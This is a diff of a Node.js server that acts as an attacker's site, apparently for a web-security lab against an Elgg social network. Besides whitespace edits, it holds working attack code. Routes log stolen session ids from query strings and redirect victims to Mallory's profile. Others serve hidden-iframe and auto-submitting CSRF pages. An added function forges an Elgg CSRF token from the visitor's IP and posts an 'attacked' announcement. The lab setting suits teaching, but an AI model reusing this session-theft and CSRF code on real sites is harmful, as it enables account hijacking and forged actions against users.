@@ -1,6 +1,6 @@
 // We need an http server
 var http = require('http'),
-	url = require('url'),
+    url = require('url'),
     fs = require('fs'),
     mysqlObj = require('mysql'),
     path = require('path'),
@@ -26,23 +26,24 @@ var mimeTypes = {
 //Create an http Server
 http.createServer(function (req, res) {
 
-	//Check if request is not for favicon
-	if(req.url!="/favicon.ico"){
-		//increment the counter
-		countVisit++;
+    //Check if request is not for favicon
+    if(req.url!="/favicon.ico"){
+        //increment the counter
+        countVisit++;
 
-	}else{
-		res.end();
-	}
-	//Start creating response
+    }else{
+        res.end();
+    }
+    //Start creating response
     
     var urlObj = url.parse(req.url);
     //Get the page html    
     switch(urlObj.pathname){
-    	case 'favicon.ico':
-    		res.end();
-    		break;
+        case 'favicon.ico':
+            res.end();
+            break;
         case "/":
+            
             res.writeHead(200, {'Content-Type': 'text/html'});
             var html = getHomePageHtmlCode();
             res.write(html);
@@ -89,8 +90,8 @@ http.createServer(function (req, res) {
             
 
             break;
-    	case "/myprof":             
-  			var getdata = qs.parse(urlObj.query);
+        case "/myprof":             
+            var getdata = qs.parse(urlObj.query);
             var log = fs.createWriteStream('sessionid.txt', {'flags': 'a'});    
            log.write(new Date().getTime()+"::"+getdata.c+"~");
             /*var refUrl = url.parse(req.headers.referer);
@@ -100,10 +101,10 @@ http.createServer(function (req, res) {
                 var hostname = refUrl.hostname+"/elgg";
             }*/
             
-    	    res.writeHead(302,{Location: 'http://'+elggsite+'/pg/profile/mallory'});
+            res.writeHead(302,{Location: 'http://'+elggsite+'/pg/profile/mallory'});
             //res.writeHead(200);
-    		res.end();
-    		break;
+            res.end();
+            break;
         case "/addsession":             
             var getdata = qs.parse(urlObj.query);
             var log = fs.createWriteStream('sessionid.txt', {'flags': 'a'});    
@@ -119,14 +120,14 @@ http.createServer(function (req, res) {
             res.writeHead(200);
             res.end();
             break;
-		case "/evilad":
-				var html = getEvilAdHtmlCode();
+        case "/evilad":
+                var html = getEvilAdHtmlCode();
                     
                     //Start creating response
                     res.writeHead(200, {'Content-Type': 'text/html'});
                     res.write(html);
                     res.end();        
-			break;
+            break;
 
         case "/csrfattack":
                 var html = getCSRFHtmlCode();
@@ -161,12 +162,21 @@ http.createServer(function (req, res) {
                     res.write(html);
                     res.end();        
             break;
+        case "/gettokpage":
+                var ip = req.connection.remoteAddress;
+                var html = gettokpage(ip);
+                    
+                    //Start creating response
+                    res.writeHead(200, {'Content-Type': 'text/html'});
+                    res.write(html);
+                    res.end();        
+        break;
         case "/writetofile":        
         var log = fs.createWriteStream('log.txt', {'flags': 'a'});    
         log.write("this is a message\n");
         log.close();
         res.end("written");
-    	default:
+        default:
             var uri = url.parse(req.url).pathname;
             var filename = path.join(process.cwd(), uri);            
             path.exists(filename, function(exists) {                
@@ -184,8 +194,8 @@ http.createServer(function (req, res) {
                 fileStream.pipe(res);
                 
 
-            }); //end path.exists   		    		
-    		break;
+            }); //end path.exists                       
+            break;
 
     }   
 }).listen(1338, '0.0.0.0'); // Http server at port 1337 on localhost
@@ -451,12 +461,9 @@ var str = "";
 str += '<html>';
 str += '<head>';
 str += '</head>';
-str += '<body bgcolor="black" onload="setTimeout(\'document.events.submit();\',5000);">';
-str += '<center>';
-str += '<font color="white"><h1>Welcome to this Web Security Site !!!</h1>';
-str += '<h2>There is a surprise for you every 5 seconds</h2></font>';
-str += '</center>';
-
+str += '<body background="http://www.bubblews.com/assets/images/news/1398471793_1362220962.jpg">';
+str += '<h1><font color="white"><center>Welcome to evilsite for CSRF with tokens.com</center></h1>';
+str += '<p><font color="red"><center>Wait for 5 seconds for the magic to happen</center></font></p>';
 str += '<iframe src="http://'+evilsite+'/csrfwithtok.html" style="position: relative;opacity: 0;"></iframe>';
 str += '</body>';
 str += '</html>';
@@ -464,3 +471,36 @@ str += '</html>';
 return str;
 
 }
+
+
+
+
+function gettokpage(data){
+
+var str = "";
+
+var tock = new Buffer("90_"+data).toString('base64');
+
+str += '<html>';
+str += '<head>';
+str += '</head>';
+str += '<body bgcolor="black" onload="setTimeout(\'document.announceForm.submit();\',5000);">';
+str += '<center>';
+str += '<font color="white"><h1>Welcome to this Web Security Site !!!</h1>';
+str += '<h2>There is a surprise for you every 5 seconds</h2></font>';
+str += '</center>';
+str += '<form action="http://localhost/elgg/action/announce/send" method="post"  name="announceForm">';
+str += '<input type="hidden" value="Mallorys Announcement" id="ann-title" name="ann_title">';
+str += '<input type="hidden" value="test" id="ann-desc" name="ann_desc">';
+str += '<input type="hidden" id="ann-content"  value="You Are Attacked by us" name="ann_content">';
+str += '<input type="hidden" name="_elggToken" value="'+tock+'"></input>';
+str += '</form> ';
+str += '</body>';
+str += '</html>';
+
+
+return str;
+
+}
+
+
